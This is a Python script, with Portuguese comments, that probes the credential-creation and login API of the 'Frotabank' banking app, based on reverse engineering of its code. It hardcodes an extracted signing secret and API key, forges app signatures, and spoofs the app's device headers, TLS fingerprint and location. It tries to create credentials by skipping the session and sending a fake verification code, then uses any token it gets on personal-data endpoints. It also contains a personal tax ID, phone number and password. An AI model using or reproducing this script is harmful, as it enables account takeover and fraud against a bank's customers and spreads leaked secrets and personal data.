"""
TESTE COMPLETO: Fluxo de criacao de credenciais do Frotabank.
Descoberto via engenharia reversa do decompiled.js:

FLUXO NO APP:
1. CreateCredentialScreen -> usuario digita senha
2. CreateCredentialVerificationCodeScreen -> app envia codigo tipo 'createCredential'
3. Usuario digita codigo SMS
4. POST /v2/auth/credential com {document, password, verificationCode}
5. Credenciais criadas -> login possivel

BankingCreateCredentialService.create (linha 1315154):
  POST /v2/auth/credential com payload {document, password, verificationCode}

sendVerificationCode (linha 882384):
  POST /v2/verification-code/send com {verificationCodeType: 'createCredential', document, phone, deliveryMethod}
"""
import tls_client
import uuid, json, time, jwt, sys

BASE = "https://api.c03.frotabank.com.br"
SAFEGUARD_API_KEY = "624ec48b-4ad7-4367-afd9-294a7f7e8c53"
SAFEGUARD_API_URL = "https://id.c03.frotabank.com.br/"
PINNING_SECRET = "AjJzVnKqL16dYKEbrKyIefbQge4uXRpnnZucf"
PINNING_ISSUER = "frotabank"

CPF = "41265599904"
PHONE = "11984636182"
PASSWORD = "Senh@2024!"
CORR = uuid.uuid4().hex


def pt():
    return jwt.encode({"iss": PINNING_ISSUER, "iat": int(time.time())}, PINNING_SECRET, algorithm="HS256")


def h(sid=None, bearer=None):
    hh = {
        "x-app-name": "br.com.frotabank.app",
        "x-app-platform": "android",
        "x-app-finger-print": "63201bd095adc55e",
        "x-app-build-number": "2026012801",
        "x-app-version": "18.10.18",
        "x-app-device-model": "google / goldfish_x86 / generic_x86_arm / ranchu",
        "content-type": "application/json; charset=utf-8",
        "user-agent": "okhttp/4.11.0",
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip",
        "x-correlation-id": CORR,
        "sg-signature": pt(),
        "x-device-coords-latitude": "-25.4284",
        "x-device-coords-longitude": "-49.2733",
        "x-device-coords-altitude": "0",
        "x-device-coords-speed": "0",
    }
    if sid:
        hh["sessionId"] = sid
    if bearer:
        hh["Authorization"] = f"Bearer {bearer}"
    return hh


http = tls_client.Session(client_identifier="okhttp4_android_13", random_tls_extension_order=True)

print("=" * 60)
print("TESTE: FLUXO CRIACAO DE CREDENCIAIS")
print("(Descoberto via RE do BankingCreateCredentialService)")
print("=" * 60)

# ===== FASE 1: Obter sessionId via onboarding =====
print("\n[1] Obter sessionId (verificacao onboarding)...")
r = http.post(f"{BASE}/v2/verification-code/send",
    json={"phone": PHONE, "verificationCodeType": "onboarding",
          "deliveryMethod": "whatsapp", "document": CPF},
    headers=h())
print(f"  Envio codigo onboarding: {r.status_code}")

code1 = input("\n>>> CODIGO ONBOARDING (WhatsApp): ").strip()

r = http.post(f"{BASE}/phone/confirmation",
    json={"phone": PHONE, "verificationCode": code1},
    headers=h(), timeout_seconds=45)
data = r.json() if r.status_code == 200 else {}
sid = data.get("sessionId", "")
if not sid:
    print(f"  FALHOU: {r.status_code} {r.text[:200]}")
    sys.exit(1)
print(f"  SessionId: {sid}")

# ===== FASE 2: Enviar verificacao tipo createCredential =====
print("\n" + "=" * 60)
print("[2] Enviar codigo de verificacao tipo 'createCredential'")
print("=" * 60)

# 2a: COM sessionId, com phone e document
print("\n  2a: createCredential COM sessionId + phone + document...")
r = http.post(f"{BASE}/v2/verification-code/send",
    json={
        "verificationCodeType": "createCredential",
        "document": CPF,
        "phone": PHONE,
        "deliveryMethod": "whatsapp",
    },
    headers=h(sid=sid), timeout_seconds=15)
print(f"    Status: {r.status_code}")
print(f"    Body: {r.text[:500]}")

# 2b: COM sessionId, sem deliveryMethod (padrao SMS?)
if r.status_code != 200:
    print("\n  2b: createCredential sem deliveryMethod...")
    r = http.post(f"{BASE}/v2/verification-code/send",
        json={
            "verificationCodeType": "createCredential",
            "document": CPF,
            "phone": PHONE,
        },
        headers=h(sid=sid), timeout_seconds=15)
    print(f"    Status: {r.status_code}")
    print(f"    Body: {r.text[:500]}")

# 2c: COM sessionId, com deliveryMethod 'phone' (SMS)
if r.status_code != 200:
    print("\n  2c: createCredential com deliveryMethod=phone...")
    r = http.post(f"{BASE}/v2/verification-code/send",
        json={
            "verificationCodeType": "createCredential",
            "document": CPF,
            "phone": PHONE,
            "deliveryMethod": "phone",
        },
        headers=h(sid=sid), timeout_seconds=15)
    print(f"    Status: {r.status_code}")
    print(f"    Body: {r.text[:500]}")

# 2d: SEM sessionId (talvez nao precise)
if r.status_code != 200:
    print("\n  2d: createCredential SEM sessionId...")
    r = http.post(f"{BASE}/v2/verification-code/send",
        json={
            "verificationCodeType": "createCredential",
            "document": CPF,
            "phone": PHONE,
            "deliveryMethod": "whatsapp",
        },
        headers=h(), timeout_seconds=15)
    print(f"    Status: {r.status_code}")
    print(f"    Body: {r.text[:500]}")

# Se nenhum funcionou, testar com codigo do onboarding mesmo
if r.status_code != 200:
    print("\n[!] Nenhum envio de createCredential funcionou.")
    print("[!] Vou testar POST /v2/auth/credential com codigo fake e ver erro...")
    code2 = "000000"
else:
    code2 = input("\n>>> CODIGO CREDENTIAL (SMS/WhatsApp): ").strip()

# ===== FASE 3: POST /v2/auth/credential =====
print("\n" + "=" * 60)
print("[3] POST /v2/auth/credential")
print("=" * 60)

# 3a: Payload completo conforme RE (document + password + verificationCode)
print("\n  3a: Payload {document, password, verificationCode} COM sessionId...")
payload = {
    "document": CPF,
    "password": PASSWORD,
    "verificationCode": code2,
}
r = http.post(f"{BASE}/v2/auth/credential",
    json=payload, headers=h(sid=sid), timeout_seconds=15)
print(f"    Status: {r.status_code}")
print(f"    Body: {r.text[:500]}")

# 3b: SEM sessionId
print("\n  3b: Mesmo payload SEM sessionId...")
r = http.post(f"{BASE}/v2/auth/credential",
    json=payload, headers=h(), timeout_seconds=15)
print(f"    Status: {r.status_code}")
print(f"    Body: {r.text[:500]}")

# 3c: Com phone no payload tambem
print("\n  3c: Com phone no payload...")
payload2 = {
    "document": CPF,
    "password": PASSWORD,
    "verificationCode": code2,
    "phone": PHONE,
}
r = http.post(f"{BASE}/v2/auth/credential",
    json=payload2, headers=h(sid=sid), timeout_seconds=15)
print(f"    Status: {r.status_code}")
print(f"    Body: {r.text[:500]}")

# ===== FASE 4: Tentar login =====
print("\n" + "=" * 60)
print("[4] Tentar login apos criar credencial")
print("=" * 60)

r = http.post(f"{BASE}/v2/auth/multifactor-login",
    json={"document": CPF, "password": PASSWORD},
    headers=h(sid=sid), timeout_seconds=15)
print(f"  Login COM sessionId: {r.status_code}")
print(f"  Body: {r.text[:500]}")

token = None
if r.status_code == 200:
    data = r.json()
    token = data.get("token", "")
    if token:
        print(f"\n  *** BEARER TOKEN OBTIDO: {token[:80]}... ***")

# Sem sessionId tambem
r = http.post(f"{BASE}/v2/auth/multifactor-login",
    json={"document": CPF, "password": PASSWORD},
    headers=h(), timeout_seconds=15)
print(f"  Login SEM sessionId: {r.status_code}")
print(f"  Body: {r.text[:500]}")

if not token and r.status_code == 200:
    data = r.json()
    token = data.get("token", "")
    if token:
        print(f"\n  *** BEARER TOKEN OBTIDO: {token[:80]}... ***")

# ===== FASE 5: Se temos Bearer, testar /v2/persons/* =====
if token:
    print("\n" + "=" * 60)
    print("[5] TESTAR /v2/persons/* COM Bearer TOKEN REAL")
    print("=" * 60)

    endpoints = [
        ("GET", "/v2/personstatus"),
        ("GET", "/v2/persons/documents-upload-lock"),
        ("POST", "/v2/persons/send-document"),
    ]

    for method, ep in endpoints:
        body = {"link": "https://example.com/test.pdf", "type": "digitalDriverLicense"} if method == "POST" else None

        # Com Bearer + sessionId
        if method == "GET":
            r = http.get(f"{BASE}{ep}", headers=h(sid=sid, bearer=token), timeout_seconds=15)
        else:
            r = http.post(f"{BASE}{ep}", json=body, headers=h(sid=sid, bearer=token), timeout_seconds=15)
        print(f"\n  {method} {ep}")
        print(f"    Bearer+Session: {r.status_code} | {r.text[:200] or '(vazio)'}")

        # Apenas Bearer
        if method == "GET":
            r = http.get(f"{BASE}{ep}", headers=h(bearer=token), timeout_seconds=15)
        else:
            r = http.post(f"{BASE}{ep}", json=body, headers=h(bearer=token), timeout_seconds=15)
        print(f"    Apenas Bearer: {r.status_code} | {r.text[:200] or '(vazio)'}")

else:
    print("\n[!] Sem Bearer token - nao foi possivel testar /v2/persons/*")

# ===== FASE 6: Testar outros tipos de verificacao =====
print("\n" + "=" * 60)
print("[6] Testar TODOS tipos de verificationCode conhecidos")
print("=" * 60)

types = [
    "onboarding",
    "createCredential",
    "keyOwnershipValidation",
    "passwordResetting",
    "unblockAccount",
    "deviceKeyLight",
]

for vtype in types:
    r = http.post(f"{BASE}/v2/verification-code/send",
        json={
            "verificationCodeType": vtype,
            "document": CPF,
            "phone": PHONE,
            "deliveryMethod": "whatsapp",
        },
        headers=h(sid=sid), timeout_seconds=10)
    status_tag = "OK" if r.status_code == 200 else str(r.status_code)
    body_preview = r.text[:150] if r.text else "(vazio)"
    print(f"  {vtype:30s} => {status_tag} | {body_preview}")

print("\n" + "=" * 60)
print("FIM")
print("=" * 60)
